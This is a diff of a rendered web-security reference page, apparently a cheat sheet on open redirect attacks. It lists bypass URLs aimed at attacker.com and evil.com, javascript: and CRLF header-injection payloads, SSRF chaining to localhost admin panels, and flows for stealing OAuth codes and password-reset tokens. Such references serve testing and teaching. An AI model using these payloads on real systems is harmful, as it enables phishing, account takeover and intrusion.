-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com\@attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com\.attacker.com
-</span></span></span></code></pre></div><p><strong>Unicode/IDN Homograph:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Using</span> <span style="color:#a6e22e">lookalike</span> <span style="color:#a6e22e">Unicode</span> <span style="color:#a6e22e">characters</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com (actual: trusted.com with Cyrillic &#39;o&#39;)
-</span></span></span></code></pre></div><h3 id="encoding-bypasses">
-  Encoding Bypasses
-  <a class="anchor" href="#encoding-bypasses">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com%2F@attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https://trusted.com%09@attacker.com</span></span></span></code></pre></div><p><strong>Path Traversal:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com/../../evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https://trusted.com/../../../../../evil.com</span></span></span></code></pre></div><p><strong>Null Byte Injection:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com%00.attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https://trusted.com%00@attacker.com</span></span></span></code></pre></div><p><strong>Backslash vs Forward Slash:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https://trusted.com\@attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https://trusted.com\.attacker.com</span></span></span></code></pre></div><p><strong>Unicode/IDN Homograph:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Using</span> <span style="color:#a6e22e">lookalike</span> <span style="color:#a6e22e">Unicode</span> <span style="color:#a6e22e">characters</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https://trusted.com (actual: trusted.com with Cyrillic &#39;o&#39;)</span></span></span></code></pre></div><h3 id="encoding-bypasses">Encoding Bypasses<a class="anchor" href="#encoding-bypasses">#</a></h3>
 <p><strong>URL Encoding:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https%3A%2F%2Fattacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https%3a%2f%2fattacker.com
-</span></span></span></code></pre></div><p><strong>Double URL Encoding:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https%253A%252F%252Fattacker.com
-</span></span></span></code></pre></div><p><strong>Mixed Encoding:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https%3A//attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https:%2F%2Fattacker.com
-</span></span></span></code></pre></div><p><strong>Hex Encoding:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=\x68\x74\x74\x70\x73://attacker.com
-</span></span></span></code></pre></div><h3 id="javascript-protocol-bypasses">
-  JavaScript Protocol Bypasses
-  <a class="anchor" href="#javascript-protocol-bypasses">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https%3A%2F%2Fattacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https%3a%2f%2fattacker.com</span></span></span></code></pre></div><p><strong>Double URL Encoding:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https%253A%252F%252Fattacker.com</span></span></span></code></pre></div><p><strong>Mixed Encoding:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=https%3A//attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=https:%2F%2Fattacker.com</span></span></span></code></pre></div><p><strong>Hex Encoding:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=\x68\x74\x74\x70\x73://attacker.com</span></span></span></code></pre></div><h3 id="javascript-protocol-bypasses">JavaScript Protocol Bypasses<a class="anchor" href="#javascript-protocol-bypasses">#</a></h3>
 <p><strong>Basic JavaScript Protocol:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=javascript:alert(document.domain)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=javascript:window.location=&#39;https://attacker.com&#39;
-</span></span></span></code></pre></div><p><strong>Encoded JavaScript:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=java%09script:alert(1)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=java%0ascript:alert(1)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=javascript%3Aalert(1)
-</span></span></span></code></pre></div><p><strong>Case Manipulation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=jAvAsCrIpT:alert(1)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=JaVaScRiPt:alert(1)
-</span></span></span></code></pre></div><h3 id="crlf-injection-for-redirect">
-  CRLF Injection for Redirect
-  <a class="anchor" href="#crlf-injection-for-redirect">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=javascript:alert(document.domain)
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=javascript:window.location=&#39;https://attacker.com&#39;</span></span></span></code></pre></div><p><strong>Encoded JavaScript:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=java%09script:alert(1)
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=java%0ascript:alert(1)
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=javascript%3Aalert(1)</span></span></span></code></pre></div><p><strong>Case Manipulation:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/redirect?url=jAvAsCrIpT:alert(1)
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/redirect?url=JaVaScRiPt:alert(1)</span></span></span></code></pre></div><h3 id="crlf-injection-for-redirect">CRLF Injection for Redirect<a class="anchor" href="#crlf-injection-for-redirect">#</a></h3>
 <p><strong>Header Injection:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/page?lang=en%0D%0ALocation:%20https://attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/page?lang=en%0D%0ALocation:%20https://attacker.com
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Results</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">injected</span> <span style="color:#a6e22e">header</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com
-</span></span></span></code></pre></div><p><strong>Double CRLF:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.com/page?param=value%0D%0A%0D%0ALocation:%20https://evil.com
-</span></span></span></code></pre></div><h3 id="oauth-token-theft-via-open-redirect">
-  OAuth Token Theft via Open Redirect
-  <a class="anchor" href="#oauth-token-theft-via-open-redirect">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//attacker.com</span></span></span></code></pre></div><p><strong>Double CRLF:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.com/page?param=value%0D%0A%0D%0ALocation:%20https://evil.com</span></span></span></code></pre></div><h3 id="oauth-token-theft-via-open-redirect">OAuth Token Theft via Open Redirect<a class="anchor" href="#oauth-token-theft-via-open-redirect">#</a></h3>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">initiates</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">login</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">initiates</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">login</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">manipulates</span> <span style="color:#a6e22e">redirect_uri</span> <span style="color:#a6e22e">parameter</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Authorization</span> <span style="color:#a6e22e">code</span> <span style="color:#a6e22e">sent</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">attacker</span><span style="color:#f92672">-</span><span style="color:#a6e22e">controlled</span> <span style="color:#a6e22e">URL</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">exchanges</span> <span style="color:#a6e22e">code</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">token</span>
@@ -1643,44 +1540,33 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Malicious</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">request</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//oauth-provider.com/authorize?
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">legitimate</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">legitimate</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com/callback
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">scope</span><span style="color:#f92672">=</span><span style="color:#a6e22e">full_access</span>
-</span></span></code></pre></div><h3 id="chaining-with-ssrf">
-  Chaining with SSRF
-  <a class="anchor" href="#chaining-with-ssrf">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">scope</span><span style="color:#f92672">=</span><span style="color:#a6e22e">full_access</span></span></span></code></pre></div><h3 id="chaining-with-ssrf">Chaining with SSRF<a class="anchor" href="#chaining-with-ssrf">#</a></h3>
 <p><strong>Using Open Redirect to Bypass SSRF Protections:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">SSRF</span> <span style="color:#a6e22e">protection</span> <span style="color:#a6e22e">blocks</span> <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">IPs</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">SSRF</span> <span style="color:#a6e22e">protection</span> <span style="color:#a6e22e">blocks</span> <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">IPs</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">But</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted.com/redirect?url=http://127.0.0.1:8080/admin
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">SSRF</span> <span style="color:#a6e22e">payload</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">url</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted.com/redirect?url=http://localhost/admin
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Request</span> <span style="color:#a6e22e">appears</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">go</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">But</span> <span style="color:#a6e22e">actually</span> <span style="color:#a6e22e">redirects</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">admin</span> <span style="color:#a6e22e">panel</span>
-</span></span></code></pre></div><hr>
-<h2 id="advanced-attack-scenarios">
-  Advanced Attack Scenarios
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h3 id="1-oauth-authorization-code-theft-via-open-redirect">
-  1. OAuth Authorization Code Theft via Open Redirect
-  <a class="anchor" href="#1-oauth-authorization-code-theft-via-open-redirect">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">But</span> <span style="color:#a6e22e">actually</span> <span style="color:#a6e22e">redirects</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">admin</span> <span style="color:#a6e22e">panel</span></span></span></code></pre></div><hr>
+<h2 id="advanced-attack-scenarios">Advanced Attack Scenarios<a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h3 id="1-oauth-authorization-code-theft-via-open-redirect">1. OAuth Authorization Code Theft via Open Redirect<a class="anchor" href="#1-oauth-authorization-code-theft-via-open-redirect">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>OAuth provider insufficiently validates redirect_uri, allowing attacker to receive victim&rsquo;s authorization code.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">crafts</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">URL</span><span style="color:#f92672">:</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">crafts</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">URL</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//oauth-provider.com/authorize?
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">legit</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>
+</span></span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">legit</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>
 </span></span><span style="display:flex;"><span>     <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com/steal
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
+</span></span></span><span style="display:flex;"><span>     <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
 </span></span><span style="display:flex;"><span>     <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">state</span><span style="color:#f92672">=</span><span style="color:#a6e22e">random</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">clicks</span> <span style="color:#a6e22e">link</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">authorizes</span> <span style="color:#a6e22e">application</span>
@@ -1690,16 +1576,12 @@ https://github.com/alex-shpak/hugo-book
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">4. Attacker exchanges code for access token
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5. Full account takeover on victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span>
-</span></span></code></pre></div><hr>
-<h3 id="2-password-reset-token-theft">
-  2. Password Reset Token Theft
-  <a class="anchor" href="#2-password-reset-token-theft">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5. Full account takeover on victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span></span></span></code></pre></div><hr>
+<h3 id="2-password-reset-token-theft">2. Password Reset Token Theft<a class="anchor" href="#2-password-reset-token-theft">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Password reset flow includes redirect parameter that leaks reset token to attacker via Referer header.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">reset</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">victim</span><span style="color:#e6db74">&#39;s account:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">reset</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">victim</span><span style="color:#e6db74">&#39;s account:
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   POST /password-reset
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   email=victim@email.com&amp;redirect=https://attacker.com
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
@@ -1713,18 +1595,14 @@ https://github.com/alex-shpak/hugo-book
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5. Attacker extracts token from logs
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6. Attacker resets victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">password</span>
-</span></span></code></pre></div><hr>
-<h3 id="3-phishing-campaign-using-trusted-domain">
-  3. Phishing Campaign Using Trusted Domain
